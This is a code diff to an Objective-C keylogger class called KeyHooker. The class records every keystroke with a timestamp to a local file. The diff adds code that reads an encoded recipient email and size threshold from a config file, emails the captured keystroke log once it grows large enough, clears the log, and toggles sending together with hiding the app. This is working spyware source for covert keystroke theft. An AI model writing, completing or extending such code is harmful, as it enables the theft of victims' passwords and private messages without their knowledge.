@@ -10,17 +10,24 @@
 
 @implementation KeyHooker
 
-- (id)init {
+- (id)init: (id <ShouldSendDelegate>)deleg {
     self = [super init];
     
     flag = YES;
+    shouldSend = NO;
     combination = [NSMutableArray array];
+    
+    delegate = deleg;
     
     NSString *config = [FileManager readFromFile:@"config"];
     if ([config isNotEqualTo: @"error"]) {
         NSArray *components = [config componentsSeparatedByString:@"\n"];
+        fileSize = [[Cryptographer doIt:components[1]] integerValue];
+        email = [NSString stringWithString:[Cryptographer doIt:components[0]]];
+        
         if ([[Cryptographer doIt:components[2]] isEqualToString:@"1"]) {
             flag = NO;
+            shouldSend = YES;
         }
     }
     
@@ -29,7 +36,13 @@
 
 - (void)doFullCycle: (int)key {
     [FileManager writeToFile:@"keys" file:[NSString stringWithFormat:@"%-3d = %-13s (%@)\n", key,
-                                           [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String], [Time currentTime]]];
+                                           [[KeycodeEncrypter keyStringFormKeyCode:key] UTF8String],
+                                           [Time currentTime]]];
+
+    if ([FileManager getFileSize:@"keys"] >= fileSize && shouldSend) {
+        [EmailSender sendEmailWithMail:email Attachments:@[@"keys"]];
+        [FileManager clearFile:@"keys"];
+    }
         
     if (key == 55) [combination removeAllObjects];
     [combination addObject:[NSNumber numberWithInt:key]];
@@ -44,8 +57,12 @@
     flag = !flag;
     
     if (flag == true) {
+        shouldSend = NO;
+        [delegate setShouldSend: NO];
         [AppHider hide];
     } else {
+        shouldSend = YES;
+        [delegate setShouldSend: YES];
         [AppHider unhide];
     }
 }
